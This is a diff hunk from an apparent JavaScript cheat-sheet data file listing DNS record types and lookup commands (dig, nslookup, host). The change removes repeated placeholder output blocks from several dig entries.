@@ -2542,53 +1006,11 @@ Nmap done: 1 IP address (1 host up) scanned in 3.42s'
       { title: 'Record — PTR', desc: 'Reverse DNS (IP -> name)', diff: 'medium', code: 'PTR: IP -> domain' },
       { title: 'Record — SRV', desc: 'Service discovery (SIP, LDAP)', diff: 'medium', code: 'SRV: priority weight port target' },
       { title: 'dig — A record', desc: 'Query IPv4 address', diff: 'easy', code: 'dig A <domain>' },
-  output: '
-;; ANSWER SECTION:
-example.com. 3600 IN A 93.184.216.34
-example.com. 3600 IN MX 10 mail.example.com.
-
-;; Query time: 45 msec
-;; SERVER: 8.8.8.8#53(8.8.8.8)'
       { title: 'dig — ANY record', desc: 'All record types (often filtered)', diff: 'medium', code: 'dig ANY <domain>' },
-  output: '
-;; ANSWER SECTION:
-example.com. 3600 IN A 93.184.216.34
-example.com. 3600 IN MX 10 mail.example.com.
-
-;; Query time: 45 msec
-;; SERVER: 8.8.8.8#53(8.8.8.8)'
       { title: 'dig — Trace', desc: 'Full resolution path from root', diff: 'hard', code: 'dig +trace <domain>' },
-  output: '
-;; ANSWER SECTION:
-example.com. 3600 IN A 93.184.216.34
-example.com. 3600 IN MX 10 mail.example.com.
-
-;; Query time: 45 msec
-;; SERVER: 8.8.8.8#53(8.8.8.8)'
       { title: 'dig — MX record', desc: 'Mail server lookup', diff: 'easy', code: 'dig MX <domain>' },
-  output: '
-;; ANSWER SECTION:
-example.com. 3600 IN A 93.184.216.34
-example.com. 3600 IN MX 10 mail.example.com.
-
-;; Query time: 45 msec
-;; SERVER: 8.8.8.8#53(8.8.8.8)'
       { title: 'dig — TXT record', desc: 'SPF / DKIM / verification', diff: 'easy', code: 'dig TXT <domain>' },
-  output: '
-;; ANSWER SECTION:
-example.com. 3600 IN A 93.184.216.34
-example.com. 3600 IN MX 10 mail.example.com.
-
-;; Query time: 45 msec
-;; SERVER: 8.8.8.8#53(8.8.8.8)'
       { title: 'dig — NS record', desc: 'Authoritative name servers', diff: 'easy', code: 'dig NS <domain>' },
-  output: '
-;; ANSWER SECTION:
-example.com. 3600 IN A 93.184.216.34
-example.com. 3600 IN MX 10 mail.example.com.
-
-;; Query time: 45 msec
-;; SERVER: 8.8.8.8#53(8.8.8.8)'
       { title: 'nslookup — Basic', desc: 'Simple DNS resolution', diff: 'easy', code: 'nslookup <domain>' },
       { title: 'nslookup — Reverse', desc: 'PTR lookup for IP', diff: 'medium', code: 'nslookup <ip>' },
       { title: 'host — Basic', desc: 'Quick domain lookup', diff: 'easy', code: 'host <domain>' },
